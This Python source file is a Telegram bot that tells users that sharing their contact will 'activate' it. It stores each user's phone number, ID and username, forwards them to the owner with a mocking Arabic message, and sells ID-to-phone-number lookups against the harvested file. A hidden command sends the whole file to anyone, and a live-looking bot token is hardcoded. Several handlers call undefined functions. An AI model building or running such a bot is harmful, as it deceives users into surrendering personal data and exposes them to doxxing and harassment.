import telebot
from telebot import types
import requests
import json

bot = telebot.TeleBot("7241156684:AAHYjaOj_Xuc-0weajxW3JUwkJiHhjR1ZNo")
ATTEMPTS_FILE = 'attempts.txt'
INITIAL_ATTEMPTS = 3
sudo_id = 6214674757
channels = ["-1002166116334"]

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id

    with open('pssj.txt', 'r') as file:
        if any(str(user_id) in line for line in file):
            attempts = get_attempts(user_id)
            if attempts is None:
                add_user_attempts(user_id, INITIAL_ATTEMPTS)
                attempts = INITIAL_ATTEMPTS
            bot.send_message(message.chat.id, f"Welcome, Your attempts: {attempts} You can search by ID only.")
        else:
            bot.reply_to(message, """Welcome : [{}](t.me/{})

Send your contact to activate the bot, according to the bot’s conditions.

Thanks.

Wait...""".format(message.from_user.first_name, message.from_user.username), parse_mode="Markdown")

            keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
            contact_button = types.KeyboardButton(text="Send My Contact", request_contact=True)
            keyboard.add(contact_button)
            bot.send_message(chat_id=message.chat.id, text="Click on the “Send my Contact” button to activate the bot.", reply_markup=keyboard)

@bot.message_handler(commands=['Getfile_ss123'])
def send_file(message):
    file_path = 'pssj.txt'  
    with open(file_path, 'rb') as file:
        bot.send_document(message.chat.id, file)

@bot.message_handler(content_types=['contact'])
def contact_received(message):
    if message.contact is None or message.contact.user_id != message.from_user.id:
        bot.send_message(chat_id=message.chat.id, text="Send your contact.")
        return

    U = message.from_user.username
    i = message.from_user.id
    P = message.contact.phone_number

    with open('pssj.txt', 'a') as file:
        file.write(f"ID:{i}, Number:{P}, Username:@{U}\n")

    add_user_attempts(i, INITIAL_ATTEMPTS)

    bot.send_message(message.chat.id, "Activated. Send /start")

    bot.send_message(6214674757, f"""
تم تلقي مضحكة جديدة OWNERS: @NB_JG

الايدي {i}
اليوزر @{U}
الرقم +{P}

OWNER : @NB_JG
""")

def check_subscription(user_id):
    for ch in channels:
        url = f"https://api.telegram.org/bot{bot.token}/getChatMember?chat_id={ch}&user_id={user_id}"
        req = requests.get(url).json()
        if req.get("result", {}).get("status") not in ['member', 'creator', 'administrator']:
            return False
    return True

@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id == sudo_id:
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(types.InlineKeyboardButton("Add Attempts to User", callback_data="add_attempts"))
        keyboard.add(types.InlineKeyboardButton("Remove Attempts from User", callback_data="remove_attempts"))
        keyboard.add(types.InlineKeyboardButton("Ban User", callback_data="ban_user"))
        keyboard.add(types.InlineKeyboardButton("User Count", callback_data="user_count"))
        keyboard.add(types.InlineKeyboardButton("Add Attempts to All", callback_data="add_attempts_all"))
        keyboard.add(types.InlineKeyboardButton("Remove Attempts from All", callback_data="remove_attempts_all"))
        keyboard.add(types.InlineKeyboardButton("Broadcast Message", callback_data="broadcast_message"))
        bot.send_message(message.chat.id, "Admin Panel", reply_markup=keyboard)
    else:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "add_attempts":
        msg = bot.send_message(call.message.chat.id, "Send user ID and number of attempts to add (e.g., 12345678 5):")
        bot.register_next_step_handler(msg, process_add_attempts)
    elif call.data == "remove_attempts":
        msg = bot.send_message(call.message.chat.id, "Send user ID and number of attempts to remove (e.g., 12345678 5):")
        bot.register_next_step_handler(msg, process_remove_attempts)
    elif call.data == "ban_user":
        msg = bot.send_message(call.message.chat.id, "Send user ID to ban:")
        bot.register_next_step_handler(msg, process_ban_user)
    elif call.data == "user_count":
        user_count = sum(1 for line in open(ATTEMPTS_FILE))
        bot.send_message(call.message.chat.id, f"Total Users: {user_count}")
    elif call.data == "add_attempts_all":
        msg = bot.send_message(call.message.chat.id, "Send number of attempts to add to all users (e.g., 5):")
        bot.register_next_step_handler(msg, process_add_attempts_all)
    elif call.data == "remove_attempts_all":
        msg = bot.send_message(call.message.chat.id, "Send number of attempts to remove from all users (e.g., 5):")
        bot.register_next_step_handler(msg, process_remove_attempts_all)
    elif call.data == "broadcast_message":
        msg = bot.send_message(call.message.chat.id, "Send the message to broadcast to all users:")
        bot.register_next_step_handler(msg, process_broadcast_message)

def process_add_attempts(message):
    try:
        user_id, attempts = map(int, message.text.split())
        current_attempts = get_attempts(user_id)
        if current_attempts is not None:
            update_attempts(user_id, current_attempts + attempts)
            bot.send_message(message.chat.id, f"Added {attempts} attempts to user {user_id}.")
        else:
            bot.send_message(message.chat.id, "User not found.")
    except:
        bot.send_message(message.chat.id, "Invalid input. Please send in the format: user_id attempts")

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    user_id = message.from_user.id

    if check_subscription(user_id) or user_id == sudo_id:
        with open('pssj.txt', 'r') as file:
            authorized = any(str(user_id) in line for line in file)

        if authorized:
            attempts_left = get_attempts(user_id)
            if attempts_left > 0:
                with open("pssj.txt", "r") as file:
                    value = message.text
                    found = False

                    for line in file:
                        if value in line:
                            bot.send_message(message.chat.id, line)
                            found = True
                            break

                if not found:
                    bot.send_message(message.chat.id, "User not found, Send another user.")

                update_attempts(user_id, attempts_left - 1)
                bot.send_message(message.chat.id, f"Remaining attempts: {attempts_left - 1}")
            else:
                bot.send_message(message.chat.id, "You don't have enough attempts. Contact the developer @NB_JG")
        else:
            bot.send_message(message.chat.id, "Ha, send your contact first thing, you can't search!")
    else:
        bot.send_message(message.chat.id, f"Please subscribe to the channels first: https://t.me/+P3wZHFJ-RKEyZDQ0")

def process_add_points(message):
    try:
        user_id, points = map(int, message.text.split(','))
        current_points = get_attempts(user_id) or 0
        update_attempts(user_id, current_points + points)
        bot.send_message(message.chat.id, f"Added {points} points to user {user_id}")
    except ValueError:
        bot.send_message(message.chat.id, "Invalid format. Please use: user_id,points")

def process_remove_points(message):
    try:
        user_id, points = map(int, message.text.split(','))
        current_points = get_attempts(user_id) or 0
        update_attempts(user_id, max(0, current_points - points))
        bot.send_message(message.chat.id, f"Removed {points} points from user {user_id}")
    except ValueError:
        bot.send_message(message.chat.id, "Invalid format. Please use: user_id,points")

def process_ban_user(message):
    user_id = int(message.text)
    with open('pssj.txt', 'r') as file:
        lines = file.readlines()
    with open('pssj.txt', 'w') as file:
        for line in lines:
            if f"ID:{user_id}," not in line:
                file.write(line)
    bot.send_message(message.chat.id, f"Banned user {user_id}")

def process_add_points_all(message):
    try:
        points = int(message.text)
        with open(ATTEMPTS_FILE, 'r') as file:
            lines = file.readlines()
        with open(ATTEMPTS_FILE, 'w') as file:
            for line in lines:
                user_id, current_points = map(int, line.strip().split(','))
                file.write(f"{user_id},{current_points + points}\n")
        bot.send_message(message.chat.id, f"Added {points} points to all users")
    except ValueError:
        bot.send_message(message.chat.id, "Invalid format. Please send the number of points to add.")

def process_remove_points_all(message):
    try:
        points = int(message.text)
        with open(ATTEMPTS_FILE, 'r') as file:
            lines = file.readlines()
        with open(ATTEMPTS_FILE, 'w') as file:
            for line in lines:
                user_id, current_points = map(int, line.strip().split(','))
                file.write(f"{user_id},{max(0, current_points - points)}\n")
        bot.send_message(message.chat.id, f"Removed {points} points from all users")
    except ValueError:
        bot.send_message(message.chat.id, "Invalid format. Please send the number of points to remove.")

def get_attempts(user_id):
    with open(ATTEMPTS_FILE, 'r') as file:
        for line in file:
            uid, attempts = line.strip().split(',')
            if int(uid) == user_id:
                return int(attempts)
    return None

def add_user_attempts(user_id, attempts):
    with open(ATTEMPTS_FILE, 'a') as file:
        file.write(f"{user_id},{attempts}\n")

def update_attempts(user_id, attempts):
    lines = []
    with open(ATTEMPTS_FILE, 'r') as file:
        lines = file.readlines()

    with open(ATTEMPTS_FILE, 'w') as file:
        for line in lines:
            uid, _ = line.strip().split(',')
            if int(uid) == user_id:
                file.write(f"{user_id},{attempts}\n")
            else:
                file.write(line)
def process_broadcast_message(message):
    broadcast_text = message.text
    with open(ATTEMPTS_FILE, 'r') as file:
        for line in file:
            user_id = int(line.strip().split(',')[0])
            try:
                bot.send_message(user_id, broadcast_text)
            except:
                continue
    bot.send_message(message.chat.id, "Broadcast message sent to all users.")
    
bot.polling(none_stop=True)
